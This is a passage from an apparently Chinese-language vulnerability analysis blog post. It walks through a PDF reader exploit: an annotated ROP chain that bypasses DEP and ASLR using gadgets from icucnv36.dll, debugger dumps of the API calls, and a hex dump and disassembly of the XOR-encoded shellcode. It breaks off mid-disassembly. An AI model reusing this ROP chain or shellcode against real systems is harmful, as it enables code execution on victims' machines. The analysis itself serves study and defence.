unused,用于补齐堆块内容长度占用的4byte</span></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a8a0000</span>,   <span class="comment"># becomes ecx ; ecx=0x4a8a0000,用于保存eax的地址</span></span><br><span class="line">  </span><br><span class="line">    <span class="number">0x4a802196</span>,   <span class="comment"># mov [ecx],eax / ret # save whatever eax starts as ; [ecx]=[0x4a8a0000]=eax,保存eax</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">    <span class="number">0x4a84903c</span>,   <span class="comment"># becomes eax (import for CreateFileA) ; CreateFileA()在输入表中表项的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -- call CreateFileA</span></span><br><span class="line">    <span class="comment"># 创建或打开一个文件或I/O设备。</span></span><br><span class="line">    <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax] ; 调用CreateFileA()</span></span><br><span class="line">    <span class="comment"># 这里用一条ret指令的地址,使程序执行流转到下一个ROPgadget(0x4a8063a5)执行,栈平衡是由CreateFileA()完成的。</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># ret ; CreateFileA()的返回地址,</span></span><br><span class="line">    <span class="number">0x4a8522c8</span>,   <span class="comment"># first arg   - lpFileName , pointer to "iso88591"</span></span><br><span class="line">    <span class="number">0x10000000</span>,   <span class="comment"># second arg  - dwDesiredAccess</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># third arg   - dwShareMode</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># fourth arg  - lpSecurityAttributes</span></span><br><span class="line">    <span class="number">0x00000002</span>,   <span class="comment"># fifth arg   - dwCreationDisposition</span></span><br><span class="line">    <span class="number">0x00000102</span>,   <span class="comment"># sixth arg   - dwFlagsAndAttributes</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># seventh arg - hTemplateFile</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx ; ecx=0x4a801064,ret指令地址</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret ; edi=0x0012E718,eax=0x00000304,eax&lt;-&gt;edi,edi保存返回值,文件句柄</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">    <span class="number">0x00000008</span>,   <span class="comment"># becomes ebx - offset to modify ; ebx=0x8,要修改位置的偏移</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># This points at a neat-o block of code that ... TBD</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#   and [esp+ebx*2],edi ; 应该只是用这句指令修改下一步要调用的函数的参数 </span></span><br><span class="line">    <span class="comment">#   jne check_slash</span></span><br><span class="line">    <span class="comment"># ret_one:</span></span><br><span class="line">    <span class="comment">#   mov al,1</span></span><br><span class="line">    <span class="comment">#   ret</span></span><br><span class="line">    <span class="comment"># check_slash:</span></span><br><span class="line">    <span class="comment">#   cmp al,0x2f</span></span><br><span class="line">    <span class="comment">#   je ret_one</span></span><br><span class="line">    <span class="comment">#   cmp al,0x41</span></span><br><span class="line">    <span class="comment">#   jl check_lower</span></span><br><span class="line">    <span class="comment">#   cmp al,0x5a</span></span><br><span class="line">    <span class="comment">#   jle check_ptr</span></span><br><span class="line">    <span class="comment"># check_lower:</span></span><br><span class="line">    <span class="comment">#   cmp al,0x61</span></span><br><span class="line">    <span class="comment">#   jl ret_zero</span></span><br><span class="line">    <span class="comment">#   cmp al,0x7a</span></span><br><span class="line">    <span class="comment">#   jg ret_zero</span></span><br><span class="line">    <span class="comment">#   cmp [ecx+1],0x3a</span></span><br><span class="line">    <span class="comment">#   je ret_one</span></span><br><span class="line">    <span class="comment"># ret_zero:</span></span><br><span class="line">    <span class="comment">#   xor al,al</span></span><br><span class="line">    <span class="comment">#   ret</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># 0x4A80A8A6 ; and dword ptr ss:[esp+ebx*2],edi(修改CreateFileMappingA第一个参数为调用CreateFileA返回的文件句柄)</span></span><br><span class="line">    <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">    <span class="number">0x4a849038</span>,   <span class="comment"># becomes eax (import for CreateFileMappingA) ; CreateFileMappingA()在输入表中表项的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -- call CreateFileMappingA</span></span><br><span class="line">    <span class="comment"># 创建或打开指定文件的命名或未命名文件映射对象。</span></span><br><span class="line">    <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax] ; 调用CreateFileMappingA()</span></span><br><span class="line">    <span class="comment"># 这里用一条ret指令的地址,使程序执行流转到下一个ROPgadget(0x4a8063a5)执行,栈平衡是由CreateFileMappingA()完成的。</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># ret ; CreateFileMappingA()的返回地址</span></span><br><span class="line">    <span class="number">0xffffffff</span>,   <span class="comment"># first arg   - hFile ; CreateFileA返回的文件句柄</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># second arg  - lpAttributes</span></span><br><span class="line">    <span class="number">0x00000040</span>,   <span class="comment"># third arg   - flProtect</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># fourth arg  - dwMaximumSizeHigh</span></span><br><span class="line">    <span class="number">0x00010000</span>,   <span class="comment"># fifth arg   - dwMaximumSizeLow</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># sixth arg   - lpName</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx ; ecx=0x4a801064,ret指令地址</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret ; edi=0x00000304,eax=0x00000320,edi&lt;-&gt;eax,edi保存返回值(0x320,文件映射对象的句柄。)</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">    <span class="number">0x00000008</span>,   <span class="comment"># becomes ebx - offset to modify ; ebx=0x8,要修改位置的偏移</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x4A80A8A6 ; and dword ptr ss:[esp+ebx*2],edi(修改MapViewOfFile第一个参数为调用CreateFileMappingA返回的文件映射对象的句柄)</span></span><br><span class="line">    <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">    <span class="number">0x4a849030</span>,   <span class="comment"># becomes eax (import for MapViewOfFile) ; MapViewOfFile()在输入表中表项的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -- call MapViewOfFile</span></span><br><span class="line">    <span class="comment"># 将一个文件映射对象映射到当前应用程序的地址空间。</span></span><br><span class="line">    <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax] ; 调用MapViewOfFile()</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># ret ; MapViewOfFile()的返回地址</span></span><br><span class="line">    <span class="number">0xffffffff</span>,   <span class="comment"># first arg   - hFileMappingObject ; CreateFileMappingA返回的文件映射对象的句柄</span></span><br><span class="line">    <span class="number">0x00000022</span>,   <span class="comment"># second arg  - dwDesiredAccess</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># third arg   - dwFileOffsetHigh</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># fourth arg  - dwFileOffsetLow</span></span><br><span class="line">    <span class="number">0x00010000</span>,   <span class="comment"># fifth arg   - dwNumberOfBytesToMap</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a8a0004</span>,   <span class="comment"># becomes ecx - writable pointer ; ecx=0x4a8a0004,可写指针,用于保存文件映射基地址的指针</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a802196</span>,   <span class="comment"># mov [ecx],eax / ret - save map base addr ; [ecx]=[0x4a8a0004]=eax=0x03550000,保存文件映射基地址</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret ; ecx=0x4a801064,ret指令地址</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret ; eax=0x03550000,edi=0x320,eax&lt;-&gt;edi,edi保存返回值(0x03550000,文件映射基地址)</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">    <span class="number">0x00000030</span>,   <span class="comment"># becomes ebx - offset to modify ; ebx=0x30,要修改位置的偏移</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x4A80A8A6 ; and dword ptr ss:[esp+ebx*2],edi(修改memcpy返回地址为调用MapViewOfFile返回的文件映射基地址)</span></span><br><span class="line">    <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">    <span class="number">0x4a8a0004</span>,   <span class="comment"># becomes eax - saved file mapping ptr ; eax=0x4a8a0004,保存文件映射基地址的指针</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a80a7d8</span>,   <span class="comment"># mov eax,[eax] / ret - load saved mapping ptr ; eax=[eax]=0x03550000,取文件映射基地址</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret ; ecx=0x4a801064,ret指令地址</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret ; eax=0x03550000,edi=0x03550000,eax&lt;-&gt;edi(0x03550000,文件映射基地址)</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">    <span class="number">0x00000020</span>,   <span class="comment"># becomes ebx - offset to modify ; ebx=0x20,要修改位置的偏移</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x4A80A8A6 ; and dword ptr ss:[esp+ebx*2],edi(修改memcpy第一个参数为调用MapViewOfFile返回的文件映射基地址)</span></span><br><span class="line">    <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret ; ecx=0x4a801064,ret指令地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># lea edx,dword ptr ss:[esp+0xC]    ; edx为0x4a8063a5的地址,edx=0x0C0C0D20,esp=0x0C0C0D14(0x4a801f90),主要语句</span></span><br><span class="line">    <span class="comment"># push edx                          ; edx=0x0C0C0D20                       </span></span><br><span class="line">    <span class="comment"># push eax                          ; eax=0x03550000</span></span><br><span class="line">    <span class="comment"># push dword ptr ss:[esp+0xC]       ; [esp+0xC]=[0x0C0C0D0C+0xC]=[0x0C0C0D18]=0x34                        </span></span><br><span class="line">    <span class="comment"># push dword ptr ds:[0x4A8A093C]    ; [0x4A8A093C]=0x0</span></span><br><span class="line">    <span class="comment"># call ecx                          ; ecx=0x4a801064,ret指令地址                      </span></span><br><span class="line">    <span class="comment"># add esp,0x10                      ; esp=esp+0x10=0x0C0C0D04+0x10=0x0C0C0D14(0x4a801f90)</span></span><br><span class="line">    <span class="comment"># retn                              ; </span></span><br><span class="line">    <span class="number">0x4a80aedc</span>,   <span class="comment"># lea edx,[esp+0xc] / push edx / push eax / push [esp+0xc] / push [0x4a8a093c] / call ecx / add esp, 0x10 / ret</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">    <span class="number">0x00000034</span>,   <span class="comment"># becomes eax ; eax=0x00000034,真正shellcode的地址相对ROPgadget(0x4a8063a5)的偏移</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a80d585</span>,   <span class="comment"># add eax,edx / ret ; eax=eax+edx=0x34+0x0C0C0D20(0x4a8063a5)=0x0C0C0D54(真正shellcode的地址)</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret ; ecx=0x4a801064,ret指令地址 </span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret ; eax=0x0C0C0D54,edi=0x03550000,eax&lt;-&gt;edi,edi保存真正shellcode的地址(eax=0x03550000,edi=0x0C0C0D54)</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">    <span class="number">0x0000000a</span>,   <span class="comment"># becomes ebx - offset to modify ; ebx=0xa,要修改位置的偏移</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x4A80A8A6 ; and dword ptr ss:[esp+ebx*2],edi(修改memcpy第二个参数为计算出的真正shellcode的地址)</span></span><br><span class="line">    <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">    <span class="number">0x4a849170</span>,   <span class="comment"># becomes eax (import for memcpy) ; memcpy()在输入表中表项的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -- call memcpy</span></span><br><span class="line">    <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line">    <span class="comment"># memcpy的返回地址,由函数块0x4a80a8a6修改,被修改为真正shellcode的地址</span></span><br><span class="line">    <span class="number">0xffffffff</span>,   <span class="comment"># this stuff gets overwritten by the block at 0x4a80aedc, becomes ret from memcpy</span></span><br><span class="line">    <span class="number">0xffffffff</span>,   <span class="comment"># becomes first arg to memcpy (dst)       ; 0x03550000,文件映射基地址</span></span><br><span class="line">    <span class="number">0xffffffff</span>,   <span class="comment"># becomes second arg to memcpy (src)      ; 0x0C0C0D54,真正shellcode的地址</span></span><br><span class="line">    <span class="number">0x00001000</span>,   <span class="comment"># becomes third arg to memcpy (length)    ; 复制长度</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这后面就是经过编码的shellcode的内容</span></span><br><span class="line">].pack(<span class="string">'V*'</span>)</span><br></pre></td></tr></table></figure></p><blockquote><p>我们可以看到调用了四个函数，<code>CreateFileA()</code>、<code>CreateFileMappingA()</code>、<code>MapViewOfFile()</code>、<code>memcpy()</code>。调用<code>createFileA()</code>函数时参数如下：</p></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 功能:创建一个文件或设备</span></span><br><span class="line">0C0C0C24   4A801064  +-<span class="keyword">CALL</span> 到 CreateFileA</span><br><span class="line">0C0C0C28   4A8522C8  | FileName = <span class="string">"iso88591"</span>    <span class="comment">; 创建一个名为iso88591的文件。</span></span><br><span class="line">0C0C0C2C   <span class="number">10000000</span>  | Access = GENERIC_ALL     <span class="comment">; 此文件访问权限为可读可写可执行。</span></span><br><span class="line">0C0C0C30   <span class="number">00000000</span>  | ShareMode = <span class="number">0</span>            <span class="comment">; 共享模式，0:阻止其他进程在请求删除，读取或写入访问权限时打开文件或设备。</span></span><br><span class="line">0C0C0C34   <span class="number">00000000</span>  | pSecurity = NULL         <span class="comment">; 此参数为NULL，则CreateFile返回的句柄，不能由应用程序可能创建的任何子进程继承，并且与返回的句柄关联的文件或设备将获取默认安全描述符。</span></span><br><span class="line">0C0C0C38   <span class="number">00000002</span>  | Mode = CREATE_ALWAYS     <span class="comment">; 始终创建一个新文件。</span></span><br><span class="line">0C0C0C3C   <span class="number">00000102</span>  | Attributes = HIDDEN|TEMPORARY    <span class="comment">; 文件属性：隐藏文件|临时文件</span></span><br><span class="line">0C0C0C40   <span class="number">00000000</span>  +-hTemplateFile = NULL     <span class="comment">; hTemplateFile为一个文件或设备句柄，表示按这个参数给出的句柄为模板创建文件。通常这个参数设置为NULL，为空表示不使用模板，一般为空。</span></span><br></pre></td></tr></table></figure><blockquote><p>调用<code>CreateFileMappingA()</code>时的参数如下：</p></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 功能：创建文件映射内核对象，文件与物理页映射</span></span><br><span class="line">0C0C0C68   4A801064  +-<span class="keyword">CALL</span> 到 CreateFileMappingA           </span><br><span class="line">0C0C0C6C   0000036C  | hFile = 0000036C                     <span class="comment">; 文件的句柄，用于创建文件映射对象的文件。CreateFileA的返回值。</span></span><br><span class="line">0C0C0C70   <span class="number">00000000</span>  | pSecurity = NULL                     <span class="comment">; 指向SECURITY_ATTRIBUTES 结构的指针，该结构确定子进程是否可以继承返回的句柄。指定一个安全对象，在创建文件映射时使用。如果为NULL（用ByVal As Long传递零），表示使用默认安全对象。</span></span><br><span class="line">0C0C0C74   <span class="number">00000040</span>  | Protection = PAGE_EXECUTE_READWRITE  <span class="comment">; 指定文件映射对象的页面保护。对象的所有映射视图必须与此保护兼容。必须使用GENERIC_READ、GENERIC_WRITE和GENERIC_EXECUTE访问权限创建hFile参数指定的文件句柄。</span></span><br><span class="line">0C0C0C78   <span class="number">00000000</span>  | MaximumSizeHigh = <span class="number">0x0</span>                <span class="comment">; 文件映射的最大长度的高32位。</span></span><br><span class="line">0C0C0C7C   <span class="number">00010000</span>  | MaximumSizeLow = <span class="number">0x10000</span>             <span class="comment">; 文件映射的最大长度的低32位。</span></span><br><span class="line">0C0C0C80   <span class="number">00000000</span>  +-MapName = NULL                       <span class="comment">; 指定文件映射对象的名字。如果此参数为NULL，则创建没有名称的文件映射对象。</span></span><br></pre></td></tr></table></figure><blockquote><p>调用<code>MapViewOfFile()</code>时的参数如下：</p></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 功能：将一个文件映射对象映射到当前应用程序的地址空间。将物理页与进程虚拟地址进行映射。</span></span><br><span class="line">0C0C0CA8   4A801064  +-<span class="keyword">CALL</span> 到 MapViewOfFile</span><br><span class="line">0C0C0CAC   <span class="number">00000370</span>  | hMapObject = <span class="number">00000370</span>        <span class="comment">; CreateFileMappingA()返回的文件映射对象句柄。</span></span><br><span class="line">0C0C0CB0   <span class="number">00000022</span>  | AccessMode = <span class="number">0x22</span>            <span class="comment">; 对文件映射对象的访问类型，它决定了页面的保护。</span></span><br><span class="line">0C0C0CB4   <span class="number">00000000</span>  | OffsetHigh = <span class="number">0x0</span>             <span class="comment">; 表示文件映射起始偏移的高32位.</span></span><br><span class="line">0C0C0CB8   <span class="number">00000000</span>  | OffsetLow = <span class="number">0x0</span>              <span class="comment">; 表示文件映射起始偏移的低32位.</span></span><br><span class="line">0C0C0CBC   <span class="number">00010000</span>  +-MapSize = <span class="number">10000</span> (<span class="number">65536</span>.)     <span class="comment">; 指定映射文件的字节数</span></span><br></pre></td></tr></table></figure><p>执行完,<code>进程内存</code>中会多一块这样的<code>内存块</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">地址=03EA0000</span><br><span class="line">大小=00010000 (65536.)</span><br><span class="line">属主=03EA0000 (自身)</span><br><span class="line">区段=</span><br><span class="line">类型=Map  00041040</span><br><span class="line">访问=RWE</span><br><span class="line">初始访问=RWE</span><br><span class="line">已映射为=\Device\HarddiskVolume1\Documents and Settings\******\桌面\iso88591</span><br></pre></td></tr></table></figure><blockquote><p>调用<code>memcopy()</code>时的参数如下：</p></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 功能：内存拷贝</span></span><br><span class="line">0C0C0D44   03EA0000  +-<span class="keyword">CALL</span> 到 memcpy</span><br><span class="line">0C0C0D48   03EA0000  | dest = 03EA0000      <span class="comment">; 目的dest内存地址，文件映射基地址</span></span><br><span class="line">0C0C0D4C   0C0C0D54  | src = 0C0C0D54       <span class="comment">; 源src内存地址，真正shellcode的地址</span></span><br><span class="line">0C0C0D50   <span class="number">00001000</span>  +-n = <span class="number">1000</span> (<span class="number">4096</span>.)     <span class="comment">; 拷贝字节数</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;最后调用<code>memcopy</code>的时候，<code>目的地址</code>就是前面<code>MapViewOfFile()</code>返回的<code>文件映射基地址</code>，而<code>源地址</code>就是真正的<code>shellcode</code>代码，将它<code>复制</code>到一段<code>可执行可读写的内存段</code>，以此<code>绕过DEP</code>。由于构造的<code>ROP指令</code>均位于不受<code>ASLR</code>保护的<code>icucnv36.dll</code>模块，因此也可以<code>绕过ASLR保护</code>。正是由于<code>DEP</code>的存在，所以<code>堆栈空间</code>是不存在<code>可执行权限</code>的，所以，我们需要创建一个<code>文件映射对象</code>，将其<code>映射</code>到<code>可读可写可执行的内存块</code>，再把shellcode拷贝到那里，就可以执行了。</p><h4 id="3、阶段3：执行shellcode"><a href="#3、阶段3：执行shellcode" class="headerlink" title="3、阶段3：执行shellcode"></a>3、阶段3：执行shellcode</h4><p>&emsp;&emsp;<code>Heap Spary</code>中使用的<code>shellcode</code>是经过编码的(<code>payload.encoded</code>)。经过分析,<code>shellcode</code>是通过<code>XOR</code>进行编码的,所以会首先执行<code>XOR解码</code>,然后再执行<code>真正的shellcode</code>功能。<br><strong><code>解码前：</code></strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 内存：</span></span><br><span class="line"><span class="comment">;....0000  BA 6D A5 42 5E DD C4 D9 74 24 F4 5D 31 C9 B1 31  簃^菽賢$鬩1杀1</span></span><br><span class="line"><span class="comment">;....0010  83 C5 04 31 55 0F 03 55 62 47 B7 A2 94 05 38 5B  兣1UUbG发?8[</span></span><br><span class="line"><span class="comment">;....0020  64 6A B0 BE 55 AA A6 CB C5 1A AC 9E E9 D1 E0 0A  dj熬U伺瑸檠?</span></span><br><span class="line"><span class="comment">;....0030  7A 97 2C 3C CB 12 0B 73 CC 0F 6F 12 4E 52 BC F4  z?&lt;?s?oNR剪</span></span><br><span class="line"><span class="comment">;....0040  6F 9D B1 F5 A8 C0 38 A7 61 8E EF 58 06 DA 33 D2  o澅酲?庯X?</span></span><br><span class="line"><span class="comment">;....0050  54 CA 33 07 2C ED 12 96 27 B4 B4 18 E4 CC FC 02  T?,??创涮?</span></span><br><span class="line"><span class="comment">;....0060  E9 E9 B7 B9 D9 86 49 68 10 66 E5 55 9D 95 F7 92  殚饭賳Ihf錟潟鲯</span></span><br><span class="line"><span class="comment">;....0070  19 46 82 EA 5A FB 95 28 21 27 13 AB 81 AC 83 17  F傟Z麜(!'珌瑑</span></span><br><span class="line"><span class="comment">;....0080  30 60 55 D3 3E CD 11 BB 22 D0 F6 B7 5E 59 F9 17  0`U???婿穅Y?</span></span><br><span class="line"><span class="comment">;....0090  D7 19 DE B3 BC FA 7F E5 18 AC 80 F5 C3 11 25 7D  ?蕹贱?瑎趺%&#125;</span></span><br><span class="line"><span class="comment">;....00A0  E9 46 54 DC 67 98 EA 5A C5 9A F4 64 79 F3 C5 EF  镕T躦橁Z艢鬱y笈</span></span><br><span class="line"><span class="comment">;....00B0  16 84 D9 25 53 7A 90 64 F5 13 7D FD 44 7E 7E 2B  勝%Sz恉?&#125;鼶~~+</span></span><br><span class="line"><span class="comment">;....00C0  8A 87 FD DE 72 7C 1D AB 77 38 99 47 05 51 4C 68  妵r|玾8橤QLh</span></span><br><span class="line"><span class="comment">;....00D0  BA 52 45 0B 5D C1 05 E2 F8 61 AF FA 0C 0C 0C 0C  篟E]?怿a....</span></span><br><span class="line"><span class="comment">;....00E0  0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ................</span></span><br><span class="line"><span class="comment">;....00F0  0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ................</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 反汇编：</span></span><br><span class="line"><span class="comment">; 异或解密流程：以0x5E42A56D为基础异或key,异或待解密数据的第一个双字,将异或的结果与0x5E42A56D相加,得到下一个双字的异或key,以此类推,ecx=ecx-0x1,直至ecx=0,退出循环。</span></span><br><span class="line">....<span class="number">0000</span>    BA 6DA5425E     <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="number">0x5E42A56D</span>                 <span class="comment">; edx=0x5E42A56D,异或数</span></span><br><span class="line">....<span class="number">0005</span>    DDC4            <span class="keyword">ffree</span> <span class="built_in">st</span>(<span class="number">4</span>)                        <span class="comment">; </span></span><br><span class="line">....<span class="number">0007</span>    D97424 F4       <span class="keyword">fstenv</span> (<span class="number">28</span>-<span class="built_in">byte</span>) <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>-<span class="number">0xC</span>]  <span class="comment">; 保存FPU环境,0x0C0C0D3C-0x0C0C0D58</span></span><br><span class="line">....<span class="number">000B</span>    <span class="number">5D</span>              <span class="keyword">pop</span> <span class="built_in">ebp</span>                            <span class="comment">; ebp=0x....0005</span></span><br><span class="line">....000C    31C9            <span 